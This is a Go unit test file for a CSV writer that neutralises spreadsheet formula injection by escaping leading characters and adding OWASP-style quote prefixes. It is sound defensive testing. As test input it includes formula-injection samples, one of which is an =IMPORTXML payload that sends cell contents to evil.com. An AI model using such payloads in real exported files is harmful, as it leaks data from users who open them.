package csv

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

func buildTest(forceDoubleQuotes bool, escapeCharEqual bool, escapeCharPlus bool, escapeCharMinus bool, escapeCharAt bool, escapeCharTab bool, escapeCharCR bool, escapeCharLF bool) string {
	var buff strings.Builder

	writer := NewSafeWriter(
		&buff,
		SafetyOpts{
			ForceDoubleQuotes: forceDoubleQuotes,
			EscapeCharEqual:   escapeCharEqual,
			EscapeCharPlus:    escapeCharPlus,
			EscapeCharMinus:   escapeCharMinus,
			EscapeCharAt:      escapeCharAt,
			EscapeCharTab:     escapeCharTab,
			EscapeCharCR:      escapeCharCR,
			EscapeCharLF:      escapeCharLF,
		},
	)
	must(writer.Write([]string{"userId", "secret", "comment"}))
	must(writer.Write([]string{"-21+63", "=A1", "foo, bar"}))
	must(writer.Write([]string{"+42", "\tsecret", "\nplop"}))
	must(writer.Write([]string{"123", "blablabla", "@foobar"}))
	writer.Flush()
	must(writer.Error())

	return buff.String()
}

func TestNewSafeWriter(t *testing.T) {
	is := assert.New(t)

	// base case
	is.Equal(
		`userId,secret,comment
-21+63,=A1,"foo, bar"
+42,"	secret","
plop"
123,blablabla,@foobar
`,
		buildTest(false, false, false, false, false, false, false, false),
	)

	// double quotes
	is.Equal(
		`"userId","secret","comment"
"-21+63","=A1","foo, bar"
"+42","	secret","
plop"
"123","blablabla","@foobar"
`,
		buildTest(true, false, false, false, false, false, false, false),
	)

	// escape "="
	is.Equal(
		`userId,secret,comment
-21+63," =A1","foo, bar"
+42,"	secret","
plop"
123,blablabla,@foobar
`,
		buildTest(false, true, false, false, false, false, false, false),
	)

	// escape "+"
	is.Equal(
		`userId,secret,comment
-21+63,=A1,"foo, bar"
" +42","	secret","
plop"
123,blablabla,@foobar
`,
		buildTest(false, false, true, false, false, false, false, false),
	)

	// escape "-"
	is.Equal(
		`userId,secret,comment
" -21+63",=A1,"foo, bar"
+42,"	secret","
plop"
123,blablabla,@foobar
`,
		buildTest(false, false, false, true, false, false, false, false),
	)

	// escape "@"
	is.Equal(
		`userId,secret,comment
-21+63,=A1,"foo, bar"
+42,"	secret","
plop"
123,blablabla," @foobar"
`,
		buildTest(false, false, false, false, true, false, false, false),
	)

	// escape "\t"
	is.Equal(
		`userId,secret,comment
-21+63,=A1,"foo, bar"
+42," 	secret","
plop"
123,blablabla,@foobar
`,
		buildTest(false, false, false, false, false, true, false, false),
	)

	// escape "\n" (LF) - use EscapeCharLF
	is.Equal(
		`userId,secret,comment
-21+63,=A1,"foo, bar"
+42,"	secret"," 
plop"
123,blablabla,@foobar
`,
		buildTest(false, false, false, false, false, false, false, true),
	)

	// escape everything
	is.Equal(
		`userId,secret,comment
" -21+63"," =A1","foo, bar"
" +42"," 	secret"," 
plop"
123,blablabla," @foobar"
`,
		buildTest(false, true, true, true, true, true, true, true),
	)

	// escape everything + force double quotes
	is.Equal(
		`"userId","secret","comment"
" -21+63"," =A1","foo, bar"
" +42"," 	secret"," 
plop"
"123","blablabla"," @foobar"
`,
		buildTest(true, true, true, true, true, true, true, true),
	)
}

func TestNewSafeWriterNoOpts(t *testing.T) {
	is := assert.New(t)

	var buff strings.Builder

	w := NewSafeWriter(&buff, SafetyOpts{})
	is.Empty(w.opts)
}

func TestFullSafety(t *testing.T) {
	is := assert.New(t)

	is.NotEmpty(FullSafety)
	is.True(FullSafety.ForceDoubleQuotes)
	is.True(FullSafety.EscapeCharEqual)
	is.True(FullSafety.EscapeCharPlus)
	is.True(FullSafety.EscapeCharMinus)
	is.True(FullSafety.EscapeCharAt)
	is.True(FullSafety.EscapeCharTab)
	is.True(FullSafety.EscapeCharCR)
	is.True(FullSafety.EscapeCharLF)
	is.False(FullSafety.PrependSingleQuote)
}

func TestEscapeAll(t *testing.T) {
	is := assert.New(t)

	is.NotEmpty(EscapeAll)
	is.False(EscapeAll.ForceDoubleQuotes)
	is.True(EscapeAll.EscapeCharEqual)
	is.True(EscapeAll.EscapeCharPlus)
	is.True(EscapeAll.EscapeCharMinus)
	is.True(EscapeAll.EscapeCharAt)
	is.True(EscapeAll.EscapeCharTab)
	is.True(EscapeAll.EscapeCharCR)
	is.True(EscapeAll.EscapeCharLF)
	is.False(EscapeAll.PrependSingleQuote)
}

func TestOWASPSafe(t *testing.T) {
	is := assert.New(t)

	is.NotEmpty(OWASPSafe)
	is.True(OWASPSafe.ForceDoubleQuotes)
	is.True(OWASPSafe.PrependSingleQuote)
}

func TestOWASPSanitization(t *testing.T) {
	is := assert.New(t)

	var buff strings.Builder
	writer := NewSafeWriter(&buff, OWASPSafe)

	// Test basic dangerous characters at start
	must(writer.Write([]string{"=SUM(A1)", "+42", "-21", "@foobar"}))
	writer.Flush()
	must(writer.Error())

	output := buff.String()
	// All fields should be wrapped in double quotes
	// Dangerous fields should have single quote prefix
	is.Contains(output, `"'=SUM(A1)"`)
	is.Contains(output, `"'+42"`)
	is.Contains(output, `"'-21"`)
	is.Contains(output, `"'@foobar"`)
}

func TestOWASPBypassPrevention(t *testing.T) {
	is := assert.New(t)

	var buff strings.Builder
	writer := NewSafeWriter(&buff, OWASPSafe)

	// Test bypass attack patterns
	must(writer.Write([]string{
		`hello","=IMPORTXML(CONCAT("http://evil.com?", A1), "//a")`, // Comma bypass
		`test";"=SUM(A1)`, // Semicolon bypass (if comma is semicolon)
		`data""=FORMULA`,  // Escaped quote bypass
		`normal text`,     // Should NOT be prefixed
		`12345`,           // Should NOT be prefixed
	}))
	writer.Flush()
	must(writer.Error())

	output := buff.String()
	// Bypass patterns should be sanitized
	// Note: Quotes get doubled in CSV output, so data"" becomes data""""
	is.Contains(output, `"'hello"",""=IMPORTXML`)
	is.Contains(output, `"'data""""=FORMULA"`) // Quotes doubled: "" becomes """"
	// Clean fields should NOT have single quote prefix
	is.Contains(output, `"normal text"`)
	is.NotContains(output, `"'normal text"`)
	is.Contains(output, `"12345"`)
	is.NotContains(output, `"'12345"`)
}

func TestOWASPSanitizeOnlyDangerous(t *testing.T) {
	is := assert.New(t)

	var buff strings.Builder
	writer := NewSafeWriter(&buff, OWASPSafe)

	// Mix of dangerous and safe fields
	must(writer.Write([]string{
		"safe text",
		"12345",
		"=FORMULA",
		"normal,field",
		"+dangerous",
	}))
	writer.Flush()
	must(writer.Error())

	output := buff.String()
	// Safe fields should NOT have single quote prefix
	is.Contains(output, `"safe text"`)
	is.NotContains(output, `"'safe text"`)
	is.Contains(output, `"12345"`)
	is.NotContains(output, `"'12345"`)
	is.Contains(output, `"normal,field"`)
	is.NotContains(output, `"'normal,field"`)

	// Dangerous fields SHOULD have single quote prefix
	is.Contains(output, `"'=FORMULA"`)
	is.Contains(output, `"'+dangerous"`)
}

func TestOWASPSpecialCharacters(t *testing.T) {
	is := assert.New(t)

	var buff strings.Builder
	writer := NewSafeWriter(&buff, OWASPSafe)

	// Test tab, CR, LF
	must(writer.Write([]string{
		"\t=FORMULA",   // Tab at start
		"\r=FORMULA",   // CR at start
		"\n=FORMULA",   // LF at start
		"normal\ttext", // Tab in middle (should not be dangerous)
	}))
	writer.Flush()
	must(writer.Error())

	output := buff.String()
	// Fields starting with special chars should be sanitized
	// Note: Use actual characters, not escape sequences in Contains check
	is.Contains(output, "'\t=FORMULA") // Tab at start
	is.Contains(output, "'\r=FORMULA") // CR at start
	is.Contains(output, "'\n=FORMULA") // LF at start
	// Tab in middle should not trigger sanitization
	is.Contains(output, "normal\ttext")
	is.NotContains(output, "'normal\ttext")
}

func TestOWASPSanitizeWithCustomDelimiter(t *testing.T) {
	is := assert.New(t)

	var buff strings.Builder
	writer := NewSafeWriter(&buff, OWASPSafe)
	writer.Comma = ';' // Use semicolon as delimiter

	// Test bypass with semicolon separator
	must(writer.Write([]string{
		`hello";"=FORMULA`, // Semicolon bypass
		`test","=FORMULA`,  // Comma bypass (should not match semicolon)
	}))
	writer.Flush()
	must(writer.Error())

	output := buff.String()
	// Semicolon bypass should be detected (quotes doubled in CSV: " becomes "")
	is.Contains(output, `"'hello"";""=FORMULA"`)
	// Comma bypass should NOT be detected (wrong separator, quotes doubled)
	is.Contains(output, `"test"",""=FORMULA"`)
	is.NotContains(output, `"'test"",""=FORMULA"`)
}
